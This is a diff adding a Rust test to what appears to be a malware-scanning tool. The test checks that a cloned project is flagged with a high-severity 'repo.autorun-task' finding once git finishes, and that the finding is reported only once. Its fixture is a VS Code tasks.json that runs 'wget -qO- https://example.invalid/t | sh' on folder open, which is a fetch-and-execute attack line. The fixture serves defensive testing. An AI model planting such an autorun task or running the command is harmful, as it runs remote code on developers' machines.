@@ -641,3 +641,52 @@ fn files_past_the_catch_up_limit_are_named_not_dropped() {
         .iter()
         .any(|e| e.summary == "1 more new file in Downloads was not checked"));
 }
+
+#[test]
+fn a_cloned_project_is_checked_once_git_finishes() {
+    let w = world();
+    let dir = tempfile::tempdir().unwrap();
+    let root = dir.path().join("Projects");
+    std::fs::create_dir(&root).unwrap();
+    let mut source =
+        super::Projects::new(vec![root.clone()], crate::runner::cancel()).settle_after(0);
+    assert!(run(&w, &mut source, crate::model::now())
+        .unwrap()
+        .0
+        .is_empty());
+    // A folder that is not a project, and a clone whose checkout is still running.
+    std::fs::create_dir(root.join("notes")).unwrap();
+    let repo = root.join("take-home");
+    std::fs::create_dir_all(repo.join(".git")).unwrap();
+    std::fs::create_dir_all(repo.join(".vscode")).unwrap();
+    std::fs::write(
+        repo.join(".vscode/tasks.json"),
+        r#"{"tasks":[{"label":"setup","command":"wget -qO- https://example.invalid/t | sh","runOptions":{"runOn":"folderOpen"}}]}"#,
+    )
+    .unwrap();
+    assert!(run(&w, &mut source, crate::model::now())
+        .unwrap()
+        .0
+        .is_empty());
+    std::fs::write(repo.join(".git/index"), "").unwrap();
+    let (events, _) = run(&w, &mut source, crate::model::now()).unwrap();
+    assert_eq!(events.len(), 1, "{events:?}");
+    let e = &events[0];
+    assert_eq!(e.source, SourceId::Project);
+    assert_eq!(e.severity, Severity::High);
+    assert_eq!(e.rule.as_deref(), Some("repo.autorun-task"));
+    assert!(e.summary.contains(": take-home · "), "{}", e.summary);
+    // Checked once, and its report does not come back through the reports source.
+    assert!(run(&w, &mut source, crate::model::now())
+        .unwrap()
+        .0
+        .is_empty());
+    let mut reports = Reports::default();
+    let (from_reports, _) = run(&w, &mut reports, crate::model::now()).unwrap();
+    assert!(
+        from_reports
+            .iter()
+            .all(|e| !e.summary.contains("take-home")),
+        "{from_reports:?}"
+    );
+}
